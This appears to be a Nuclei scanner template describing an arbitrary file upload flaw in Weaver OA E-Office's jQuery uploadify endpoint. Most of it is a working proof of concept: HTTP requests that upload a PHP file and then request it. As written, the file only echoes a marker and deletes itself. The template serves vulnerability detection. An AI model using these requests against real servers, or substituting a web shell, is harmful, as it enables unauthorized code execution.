# Nuclei Template: OA E-Office jQuery - Arbitrary File Upload
**Template ID:** weaver-jquery-file-upload
**Vulnerability Class:** Unrestricted Upload of File with Dangerous Type
**Severity:** Critical
**CWE:** CWE-434
**Source:** Nuclei Template (`weaver-jquery-file-upload.yaml`)

## Vulnerability Information & PoC

## Description
Arbitrary File Upload in OA E-Office jQuery.

## Steps to reproduce / Exploit Payload
```http
GET /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: {{Hostname}}

POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjetvpuye
Accept-Encoding: gzip

------WebKitFormBoundaryjetvpuye
Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
Content-Type: application/octet-stream

<?php echo "{{string}}";unlink(__FILE__);?>
------WebKitFormBoundaryjetvpuye--

GET /attachment/{{attachmentID}}/{{filename}}.php HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/w-digital-scanner/w9scan/blob/master/plugins/weaver_oa/2158.py
